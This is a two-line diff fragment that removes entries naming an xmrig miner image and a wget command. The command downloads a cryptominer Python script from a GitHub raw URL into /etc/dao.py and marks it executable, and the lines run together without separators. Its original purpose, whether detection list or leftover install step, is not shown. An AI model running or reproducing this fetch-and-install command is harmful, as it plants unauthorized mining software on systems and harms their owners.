@@ -1,2 +1,0 @@
-021982/xmrig, /etc/dao.py, 021982/xmrig, /etc/dao.py, wget https://raw.githubusercontent.com/nhatquanglan/daovps/master/daoxmrig_ubuntu_tor_docker.py -O /etc/dao.pychmod a+x /etc/dao.py
-021982/xmrig, /etc/dao.py, wget https://raw.githubusercontent.com/nhatquanglan/daovps/master/daoxmrig_ubuntu_tor_docker.py -O /etc/dao.pychmod a+x /etc/dao.py
